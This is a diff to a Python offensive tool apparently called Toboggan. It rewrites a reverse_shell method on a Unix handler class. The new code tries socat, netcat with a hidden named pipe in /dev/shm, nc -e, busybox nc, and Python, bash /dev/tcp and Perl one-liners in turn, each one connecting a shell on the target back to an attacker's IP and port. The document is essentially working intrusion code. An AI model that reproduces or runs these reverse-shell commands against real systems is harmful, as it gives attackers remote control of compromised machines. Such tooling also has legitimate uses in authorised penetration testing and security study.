@@ -253,32 +253,108 @@ class UnixHandler(OSHandler):
         finally:
             self._execute(f"rm -f {remote_base64_path}")
 
-    def reverse_shell(self, ip_addr: str, port: int = 443, shell: str = None) -> str:
+    def reverse_shell(self, ip_addr: str, port: int = 443, shell: str = None) -> None:
+        """
+        Attempt to establish a reverse shell using various methods (Socat, Netcat Mkfifo, Python, Bash, Perl).
+
+        Args:
+            ip_addr (str): Attacker's IP address.
+            port (int): Port number for connection.
+            shell (str): Shell to use (defaults to /bin/bash or /bin/sh if missing).
+
+        Returns:
+            str: Confirmation message.
+        """
         shell = shell or "/bin/bash"
-        if self._execute("command -v python3").strip():
+        if not self._execute(f"command -v {shell}").strip():
+            shell = "/bin/sh"
+
+        # Try Socat Reverse Shell (Best Option)
+        socat_location = self._execute("command -v socat").strip()
+        if socat_location:
             self._execute(
-                f"""/usr/bin/python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip_addr}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
+                f"{socat_location} exec:'{shell} -li',pty,stderr,setsid,sigint,sane tcp:{ip_addr}:{port}",
                 timeout=2,
                 retry=False,
             )
-            print("[Toboggan] python revershell sent.")
-        elif self._execute("command -v nc").strip():
-            if self._execute("command -v mkfifo").strip():
+            print("[Toboggan] Socat reverse shell sent.")
+            return
+
+        # Try Netcat with Mkfifo (Highly Reliable)
+        nc_location = self._execute("command -v nc").strip()
+        if nc_location:
+            mkfifo_location = self._execute("command -v mkfifo").strip()
+            if mkfifo_location:
+                fifo_path = "/dev/shm/.fifo_shell"  # Hidden named pipe
                 self._execute(
-                    f"rm /dev/shm/1;mkfifo /dev/shm/1;cat /dev/shm/1|{shell} -i 2>&1|nc {ip_addr} {port} >/dev/shm/1",
+                    f"rm -f {fifo_path}; {mkfifo_location} {fifo_path}; cat {fifo_path} | {shell} -i 2>&1 | {nc_location} {ip_addr} {port} > {fifo_path}",
                     timeout=2,
                     retry=False,
                 )
-                print("[Toboggan] mkfifo revershell sent.")
-            else:
+                print("[Toboggan] Mkfifo reverse shell sent.")
+                return
+
+            # Try Standard Netcat with `-e`
+            nc_test = self._execute(f"{nc_location} -h | grep -- '-e'").strip()
+            if nc_test:
                 self._execute(
-                    f"/bin/busybox nc {ip_addr} {port} -e {shell}",
+                    f"{nc_location} -e {shell} {ip_addr} {port}",
                     timeout=2,
                     retry=False,
                 )
-                print("[Toboggan] nc reverse shell sent.")
-        else:
-            print("[Toboggan] No possible reverse shell methods found.")
+                print("[Toboggan] Netcat (-e) reverse shell sent.")
+                return
+
+            # Try Netcat with BusyBox
+            busybox_location = self._execute("command -v busybox").strip()
+            if busybox_location:
+                self._execute(
+                    f"{busybox_location} {nc_location} {ip_addr} {port} -e {shell}",
+                    timeout=2,
+                    retry=False,
+                )
+                print("[Toboggan] BusyBox Netcat reverse shell sent.")
+                return
+
+        # Try Python-Based Reverse Shell
+        python_location = (
+            self._execute("command -v python3").strip()
+            or self._execute("command -v python").strip()
+        )
+        if python_location:
+            self._execute(
+                f"""{python_location} -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip_addr}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
+                timeout=2,
+                retry=False,
+            )
+            print("[Toboggan] Python reverse shell sent.")
+            return
+
+        # Try Bash Reverse Shell (Simple /dev/tcp)
+        bash_location = self._execute("command -v bash").strip()
+        if bash_location:
+            self._execute(
+                f"{bash_location} -i >& /dev/tcp/{ip_addr}/{port} 0>&1",
+                timeout=2,
+                retry=False,
+            )
+            print("[Toboggan] Bash reverse shell sent.")
+            return
+
+        # Try Perl Reverse Shell
+        perl_location = self._execute("command -v perl").strip()
+        if perl_location:
+            self._execute(
+                f"""{perl_location} -e 'use Socket;$i="{ip_addr}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");'""",
+                timeout=2,
+                retry=False,
+            )
+            print("[Toboggan] Perl reverse shell sent.")
+            return
+
+        # If Nothing Works, Print Error
+        print("[Toboggan] No possible reverse shell methods found.")
+        return
 
     # Protected methods
     def _get_pwd(self) -> str:
